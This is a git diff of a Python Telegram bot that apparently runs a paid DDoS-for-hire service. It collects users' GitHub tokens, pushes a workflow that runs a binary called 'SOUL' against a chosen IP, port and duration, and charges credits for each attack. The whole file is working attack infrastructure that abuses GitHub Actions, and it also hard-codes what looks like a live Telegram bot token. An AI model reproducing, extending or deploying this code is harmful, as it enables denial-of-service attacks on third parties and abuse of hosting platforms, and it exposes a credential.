@@ -3,26 +3,27 @@ import asyncio
 import base64
 import json
 import threading
-from datetime import datetime
 from flask import Flask
+from datetime import datetime
 from telegram import Update
 from telegram.constants import ChatAction
 from telegram.ext import Application, CommandHandler, ContextTypes
 from github import Github, InputGitTreeElement, Auth
 
-# Load your Telegram token from environment variable (more secure!)
-TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
-if not TELEGRAM_TOKEN:
-    raise RuntimeError("Please set the TELEGRAM_TOKEN environment variable!")
-
-ADMIN_IDS = {7163028849}
+# === Config ===
+TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN') or '7828525928:AAGyxRd-HIfgqSgBwtzM2fYRK9EIR3QImS0'
+ADMIN_IDS = {7163028849}  # Put your Telegram user ID here as int, e.g., {123456789}
 DATA_FILE = 'soul.json'
+REPO_NAME = "soulcrack90"
+CREDIT_COST_PER_ATTACK = 25
 
+# === Load saved user sessions ===
 user_sessions = {}
 if os.path.exists(DATA_FILE):
     with open(DATA_FILE, 'r') as f:
         try:
             user_sessions = json.load(f)
+            # Convert approved lists back to sets
             for session in user_sessions.values():
                 if 'approved' in session and isinstance(session['approved'], list):
                     session['approved'] = set(session['approved'])
@@ -63,11 +64,10 @@ jobs:
         run: ./SOUL {ip} {port} {time} 500 -1
 '''
 
-REPO_NAME = "soulcrack90"
-CREDIT_COST_PER_ATTACK = 25
-
 def is_admin(user_id: int) -> bool:
     return user_id in ADMIN_IDS
+
+# Telegram command handlers
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
@@ -82,6 +82,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
+        await update.message.reply_text("Unauthorized")
         return
     if len(context.args) != 2:
         await update.message.reply_text("Usage: /approve <id> <credit>")
@@ -106,6 +107,7 @@ async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
+        await update.message.reply_text("Unauthorized")
         return
     if len(context.args) != 2:
         await update.message.reply_text("Usage: /credit <id> <credit>")
@@ -130,6 +132,7 @@ async def add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
+        await update.message.reply_text("Unauthorized")
         return
     if len(context.args) != 1:
         await update.message.reply_text("Usage: /remove <id>")
@@ -147,6 +150,7 @@ async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def token(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
+        await update.message.reply_text("Unauthorized")
         return
     if not context.args:
         await update.message.reply_text("Usage: /token <token1> <token2> ...")
@@ -199,6 +203,7 @@ async def server(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not os.path.isfile("SOUL"):
         await update.message.reply_text("Local binary 'SOUL' not found!")
         return
+
     await context.bot.send_chat_action(chat_id=int(chat_id), action=ChatAction.TYPING)
     msg = await update.message.reply_text(f"{VBV_LOADING_FRAMES[0]}  0% completed")
     frame_count = len(VBV_LOADING_FRAMES)
@@ -210,7 +215,7 @@ async def server(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await msg.edit_text(display_message)
         except Exception:
             pass
-    # For all approved IDs with sufficient credit, run attack on all tokens
+
     tasks = []
     for id_ in list(approved_ids):
         credit = credits.get(id_, 0)
@@ -274,44 +279,42 @@ async def run_workflow_with_token_and_id(chat_id, github_token, ip, port, time, 
             type='blob',
             content=yml_content,
         )
-        new_tree = repo.create_git_tree([yml_element], base_tree)
-        new_commit = repo.create_git_commit("Add soul.yml workflow", new_tree, [base_commit])
-        base_ref.edit(new_commit.sha)
-        await asyncio.sleep(10)
-        await context.bot.send_message(
-            chat_id=int(chat_id),
-            text=f"ID: {id_}\nAttack started on {ip}:{port} for {time} seconds."
-        )
-        await asyncio.sleep(30)
-        await repo.delete()
+        workflow_tree = repo.create_git_tree([yml_element], base_tree)
+        workflow_commit = repo.create_git_commit("Add workflow", workflow_tree, [base_commit])
+        base_ref.edit(workflow_commit.sha)
     except Exception as e:
-        await context.bot.send_message(chat_id=int(chat_id), text=f"Error with ID {id_}: {e}")
+        # Optional: log error somewhere
+        print(f"Error in run_workflow_with_token_and_id: {e}")
 
-# Flask app to keep port alive on Render.com
-app_flask = Flask(__name__)
+# === Set up Telegram bot ===
 
-@app_flask.route('/')
-def index():
-    return "✅ Bot is running on Render!"
+def run_bot():
+    # Create the Application
+    app = Application.builder().token(TELEGRAM_TOKEN).build()
 
-def run_telegram_bot():
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    application = Application.builder().token(TELEGRAM_TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("approve", approve))
-    application.add_handler(CommandHandler("credit", add_credit))
-    application.add_handler(CommandHandler("remove", remove))
-    application.add_handler(CommandHandler("token", token))
-    application.add_handler(CommandHandler("server", server))
-    application.add_handler(CommandHandler("status", status))
-    loop.run_until_complete(application.run_polling())
+    # Add handlers
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("approve", approve))
+    app.add_handler(CommandHandler("credit", add_credit))
+    app.add_handler(CommandHandler("remove", remove))
+    app.add_handler(CommandHandler("token", token))
+    app.add_handler(CommandHandler("server", server))
+    app.add_handler(CommandHandler("status", status))
 
-def main():
-    # Run telegram bot in a thread so flask server can run simultaneously
-    threading.Thread(target=run_telegram_bot).start()
-    port = int(os.environ.get('PORT', 5000))
-    app_flask.run(host='0.0.0.0', port=port)
+    # Run the bot (this starts asyncio loop)
+    app.run_polling()
+
+# === Flask app to keep Render.com or other hosts happy ===
+flask_app = Flask(__name__)
+
+@flask_app.route("/")
+def home():
+    return "Bot is running."
 
 if __name__ == "__main__":
-    main()
+    # Run Flask in main thread
+    # Run Telegram bot in a separate thread with event loop fixed
+    bot_thread = threading.Thread(target=run_bot)
+    bot_thread.start()
+    # Run Flask on 0.0.0.0:10000 (adjust if needed)
+    flask_app.run(host="0.0.0.0", port=10000)
